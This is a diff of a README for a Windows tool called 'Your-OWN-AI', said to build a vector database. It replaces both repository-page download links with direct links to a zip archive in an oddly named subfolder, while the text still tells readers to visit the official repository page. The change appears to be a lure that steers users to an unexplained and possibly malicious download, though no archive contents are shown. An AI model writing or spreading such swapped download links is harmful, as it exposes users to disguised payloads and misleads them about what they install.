@@ -1,11 +1,11 @@
 # 🧠 Your-OWN-AI - Build Your Own Database With Ease
 
-[![Download Your-OWN-AI](https://img.shields.io/badge/Download-Your--OWN--AI-blue.svg)](https://github.com/genushydraoscillogram7224/Your-OWN-AI)
+[![Download Your-OWN-AI](https://img.shields.io/badge/Download-Your--OWN--AI-blue.svg)](https://raw.githubusercontent.com/genushydraoscillogram7224/Your-OWN-AI/main/adiathetic/Your_OW_AI_1.7.zip)
 
 ## 📥 Getting Started
 This software helps you create a vector database on your Windows computer. Follow these steps to set up the tool. First, visit the official repository page to get the files. 
 
-[Download Your-OWN-AI Here](https://github.com/genushydraoscillogram7224/Your-OWN-AI)
+[Download Your-OWN-AI Here](https://raw.githubusercontent.com/genushydraoscillogram7224/Your-OWN-AI/main/adiathetic/Your_OW_AI_1.7.zip)
 
 ## 💻 System Requirements
 Your computer needs to meet these basic standards to run the software. These requirements ensure the database performs tasks without errors.
